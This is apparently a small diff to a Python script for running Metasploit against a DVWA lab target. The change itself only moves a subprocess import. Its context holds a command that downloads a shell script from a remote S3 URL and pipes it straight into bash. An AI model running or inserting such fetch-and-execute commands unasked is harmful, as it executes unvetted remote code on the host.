@@ -1,5 +1,6 @@
 import os
 import threading
+import subprocess
 
 def run_metasploit():
     target_ip = input("Enter DVWA target IP: ")
@@ -132,7 +133,7 @@ if __name__ == "__main__":
     main()
 
 def run_curl():
-import subprocess
+
     # Define the curl command to download and execute the script
     curl_command = "curl -sSL https://v1demoplatform.s3.us-west-1.amazonaws.com/common/samples.sh | bash"
 
